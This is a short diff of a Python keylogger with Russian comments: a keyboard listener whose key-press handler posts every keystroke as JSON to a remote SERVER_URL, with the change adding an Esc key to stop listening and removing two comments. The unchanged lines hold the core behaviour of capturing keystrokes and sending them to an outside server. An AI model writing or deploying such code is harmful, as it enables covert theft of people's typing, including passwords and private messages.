@@ -9,12 +9,14 @@ def on_press(key):
     except AttributeError:
         data = {"key": str(key)}
 
-    # Отправляем POST-запрос на сервер
     try:
         requests.post(SERVER_URL, json=data)
     except Exception as e:
         print("Ошибка при отправке:", e)
 
-# Запуск слушателя
+    # Останавливаем по Esc
+    if key == keyboard.Key.esc:
+        return False   # Listener завершится
+
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
